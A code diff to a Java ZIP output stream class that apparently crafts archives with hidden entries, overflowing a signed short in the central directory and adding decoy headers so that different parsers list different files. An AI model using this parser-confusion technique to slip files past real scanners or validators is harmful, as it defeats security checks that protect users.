@@ -410,18 +410,18 @@ public class ModdedZipArchiveOutputStream extends ArchiveOutputStream {
         if(hiddenEntries.size() > 0){
             ByteArrayOutputStream centralHeaderBytes = new ByteArrayOutputStream();
 
-            for (ZipArchiveEntry ze : normalEntries)
+            for (ZipArchiveEntry ze : hiddenEntries)
                 centralHeaderBytes.write(getCentralFileHeader(ze));
 
             //Check if entries has less entries than hidden entries, if so create fakeones here..
-            int normalEntriesNeeded = hiddenEntries.size() - normalEntries.size();
+            int hiddenEntriesNeeded = normalEntries.size() - hiddenEntries.size();
 
-            for(int i = 0; i < normalEntriesNeeded; i++){
+            for(int i = 0; i < hiddenEntriesNeeded; i++){
                 ZipArchiveEntry generatedZipEntry = generateRandomDummyZipEntry();
                 putArchiveEntry(generatedZipEntry);
 
                 //TODO: Do I actually have to write data or does a 0 file work?
-                write(generatedZipEntry.getRawName());
+                write(generatedZipEntry.getName().getBytes());
                 closeArchiveEntry();
 
                 centralHeaderBytes.write(getCentralFileHeader(generatedZipEntry));
@@ -434,32 +434,35 @@ public class ModdedZipArchiveOutputStream extends ArchiveOutputStream {
             closeArchiveEntry();
 
             //Make sure we overflow a signed short
-            int paddingBytesNeeded =  Short.MAX_VALUE - centralHeaderBytes.size();
+            int paddingBytesNeeded = Short.MAX_VALUE - centralHeaderBytes.size();
 
             for(int i = 0; i < paddingBytesNeeded + 1; i++)
                 centralHeaderBytes.write(PADDING_BYTE);
 
             dummyFile.setCentralDirectoryExtra(centralHeaderBytes.toByteArray());
 
-            cdOffset = written;
 
-            writeCentralFileHeader(dummyFile);
-
-            for(ZipArchiveEntry ze : hiddenEntries)
-                writeCentralFileHeader(ze);
-
-            int hiddenEntriesNeeded = normalEntries.size() - hiddenEntries.size();
-
-            for(int i = 0; i < hiddenEntriesNeeded; i++){
+            int normalEntriesNeeded = hiddenEntries.size() - normalEntries.size();
+            List<ZipArchiveEntry> gennedEntries = new ArrayList<ZipArchiveEntry>();
+            for(int i = 0; i < normalEntriesNeeded; i++){
                 ZipArchiveEntry generatedZipEntry = generateRandomDummyZipEntry();
                 putArchiveEntry(generatedZipEntry);
 
-                write(generatedZipEntry.getRawName());
+                write(generatedZipEntry.getName().getBytes());
                 closeArchiveEntry();
-
-                writeCentralFileHeader(generatedZipEntry);
+                gennedEntries.add(generatedZipEntry);
             }
 
+            cdOffset = written;
+
+
+            for(ZipArchiveEntry ze : gennedEntries)
+              writeCentralFileHeader(ze);
+
+            for(ZipArchiveEntry ze : normalEntries)
+                writeCentralFileHeader(ze);
+
+            writeCentralFileHeader(dummyFile);
 
         } else {
             cdOffset = written;
